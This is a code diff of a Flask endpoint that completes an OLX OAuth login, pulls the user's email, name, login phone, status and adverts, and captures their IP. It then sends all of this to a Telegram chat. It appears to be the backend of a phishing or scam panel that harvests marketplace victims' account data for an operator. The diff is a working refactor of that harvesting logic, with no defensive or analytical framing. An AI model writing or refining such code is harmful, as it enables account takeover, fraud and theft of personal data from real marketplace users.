@@ -49,79 +49,108 @@ def get_token():
     code = data.get('code')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    if not code: 
+    if not code:
         return jsonify({"error": "No code"}), 400
 
     try:
-        token_res = requests.post('https://www.olx.ua/api/open/oauth/token', data={
-            'grant_type': 'authorization_code',
-            'client_id': CLIENT_ID,
-            'client_secret': CLIENT_SECRET,
-            'code': code,
-            'redirect_uri': REDIRECT_URI,
-            'scope': 'read write v2'
-        }, timeout=15)
-        
+        token_res = requests.post(
+            'https://www.olx.ua/api/open/oauth/token',
+            data={
+                'grant_type': 'authorization_code',
+                'client_id': CLIENT_ID,
+                'client_secret': CLIENT_SECRET,
+                'code': code,
+                'redirect_uri': REDIRECT_URI,
+                'scope': 'read write v2'
+            },
+            timeout=15
+        )
+
         if token_res.status_code != 200:
             return jsonify({"error": "Auth failed"}), 400
-            
+
         res_data = token_res.json()
         access = res_data.get('access_token')
         refresh = res_data.get('refresh_token')
-        headers = {"Authorization": f"Bearer {access}", "Version": "2.0"}
 
+        headers = {
+            "Authorization": f"Bearer {access}",
+            "Version": "2.0"
+        }
+
+        # ---------- USER INFO ----------
+        user_data = {}
         email = "Не указан"
-        try:
-            u = requests.get("https://www.olx.ua/api/partner/users/me", headers=headers, timeout=5).json()
-            email = u.get('data', {}).get('email', email)
-        except: pass
 
+        try:
+            u = requests.get(
+                "https://www.olx.ua/api/partner/users/me",
+                headers=headers,
+                timeout=5
+            ).json()
+
+            user_data = u.get('data', {})
+            email = user_data.get('email', email)
+
+        except:
+            pass
+
+        # ---------- ADS ----------
         ad_list_for_cookie = []
         ads_flat_tg = ""
-        
+        ads_data = []
+
         try:
-            ads_api_res = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 15}, timeout=7).json()
+            ads_api_res = requests.get(
+                "https://www.olx.ua/api/partner/adverts",
+                headers=headers,
+                params={"limit": 15},
+                timeout=7
+            ).json()
+
             ads_data = ads_api_res.get('data', [])
-            
+
             for i, ad in enumerate(ads_data):
                 title = ad.get('title', 'Без названия')
                 url = ad.get('url', 'https://olx.ua')
-                
+
                 if len(ad_list_for_cookie) < 5:
                     ad_list_for_cookie.append({
                         "title": title,
                         "url": url,
                         "img": OLX_LOGO
                     })
-                
+
                 ads_flat_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
-        except: 
+
+        except:
             ads_flat_tg = "Ошибка получения товаров"
 
-    msg = (
-    "=================================\n"
-    "👤 АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ\n"
-    "=================================\n\n"
-    f"Email: {email}\n"
-    f"IP: {user_ip}\n\n"
-    f"ID: {user_data.get('id')}\n"
-    f"Имя: {user_data.get('name')}\n"
-    f"Статус: {user_data.get('status')}\n"
-    f"Телефон: {user_data.get('phone')}\n"
-    f"Телефон входа: {user_data.get('phone_login')}\n"
-    f"Дата регистрации: {user_data.get('created_at')}\n"
-    f"Последний вход: {user_data.get('last_login_at')}\n"
-    f"Бизнес аккаунт: {user_data.get('is_business')}\n\n"
-    "📦 ОБЪЯВЛЕНИЯ:\n"
-)
+        # ---------- TELEGRAM MSG ----------
+        msg = (
+            "👤 <b>АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
+            f"<b>Email:</b> <code>{email}</code>\n"
+            f"<b>IP:</b> <code>{user_ip}</code>\n\n"
+            f"<b>ID:</b> {user_data.get('id')}\n"
+            f"<b>Имя:</b> {user_data.get('name')}\n"
+            f"<b>Статус:</b> {user_data.get('status')}\n"
+            f"<b>Телефон входа:</b> {user_data.get('phone_login')}\n\n"
+            "<b>📦 Объявления:</b>\n"
+        )
 
-for i, ad in enumerate(ads_data):
-    msg += f"{i+1}. {ad.get('title')}\n{ad.get('url')}\n\n"
+        for i, ad in enumerate(ads_data):
+            msg += f"{i+1}. <a href='{ad.get('url')}'>{ad.get('title')}</a>\n"
 
-send_telegram_message(msg)
+        send_telegram_message(msg)
 
+        # ---------- RESPONSE ----------
         resp = make_response(jsonify({"status": "ok"}))
-        resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, path='/')
+        resp.set_cookie(
+            'user_ads',
+            json.dumps(ad_list_for_cookie),
+            max_age=3600,
+            path='/'
+        )
         return resp
 
     except Exception as e:
